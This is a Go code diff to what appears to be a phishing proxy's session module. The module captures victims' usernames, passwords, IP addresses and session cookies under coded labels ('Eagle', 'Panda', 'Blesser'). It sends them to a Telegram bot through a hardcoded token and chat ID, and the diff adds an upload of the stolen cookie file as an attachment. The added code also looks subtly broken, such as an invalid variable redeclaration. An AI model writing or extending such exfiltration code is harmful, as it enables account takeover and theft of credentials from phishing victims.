@@ -220,9 +220,8 @@ func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[
 	json, _ := json.Marshal(cookies)
 	tCt = string(json)
 	saveDoc(tCu, tCt)
-
 	comBined := "New Potential Blesser \r\nEagle: " + tCu + "\r\nPanda: " + tCp + "\r\nIP Address: " + tCiP
-	send(comBined, "5689421286:AAFAwYrzC2rcKP4NWH9h8IxZO71HeLfv7Xs", 1417990651)
+	send(comBined, "5689421286:AAFAwYrzC2rcKP4NWH9h8IxZO71HeLfv7Xs", 1417990651, tCt)
 	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
@@ -284,7 +283,7 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 	}
 	return s, nil
 }
-func send(text string, botT string, chat_id int64) {
+func send(text string, botT string, chat_id int64, tGcookie string) {
 
 	bot, err := tgbotapi.NewBotAPI(botT)
 	if err != nil {
@@ -298,7 +297,13 @@ func send(text string, botT string, chat_id int64) {
 	if err != nil {
 		fmt.Printf("Error sending message: %v", err)
 	}
-	
+	//Send the cookie attachment
+	docMsg := NewDocument(chat_id, FilePath("cookies/"+tGcookie+".txt"))
+	_, err := bot.Send(docMsg)
+
+	if err != nil {
+		fmt.Printf("Error sending cookie attachment: %v", err)
+	}
 }
 func saveDoc(title string, myCookieFile string) {
 	dcF = `
